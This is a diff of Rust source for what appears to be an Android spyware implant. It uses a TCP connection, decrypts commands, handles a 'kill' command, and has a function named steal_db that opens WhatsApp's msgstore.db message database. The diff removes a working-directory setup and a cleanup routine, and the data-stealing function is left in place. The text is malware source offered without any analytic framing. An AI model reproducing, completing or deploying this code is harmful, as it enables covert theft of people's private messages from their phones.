@@ -8,16 +8,12 @@ use std::fs;
 use std::fs::File;
 use std::io::prelude::*;
 use std::string::ToString;
-//use std::{thread, time};
 use nix::unistd::*;
 use std::net::TcpStream;
-//use openssl::aes::{AesKey, KeyError, aes_ige};
 use openssl::symm::{Cipher, Crypter};
 use openssl::symm::Mode;
 use openssl::error::ErrorStack;
 use hex::{FromHex};
-
-static WORKING_DIRECTORY: &str = "toast";
 
 fn decrypt(t: Cipher,
            key: &[u8],
@@ -91,10 +87,6 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             };
         }
         if trimmed == "kill" {
-            match kill() {
-                Ok(()) => info!("No error from kill"),
-                Err(e) => error!("kill: {}", e),
-            };
             break;
         }
     }
@@ -141,16 +133,9 @@ fn setup() -> Result<(), Box<dyn std::error::Error>> {
             fs::remove_file("/data/pprt")?;
         },
     };
-    fs::create_dir(WORKING_DIRECTORY)?;
-    env::set_current_dir(WORKING_DIRECTORY)?;
     Ok(())
 }
 
-fn kill() -> Result<(), Box<dyn std::error::Error>> {
-    env::set_current_dir("..")?;
-    fs::remove_dir_all(WORKING_DIRECTORY)?;
-    Ok(())
-}
 
 fn steal_db() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
     let mut db = File::open("/data/data/com.whatsapp/databases/msgstore.db")?;
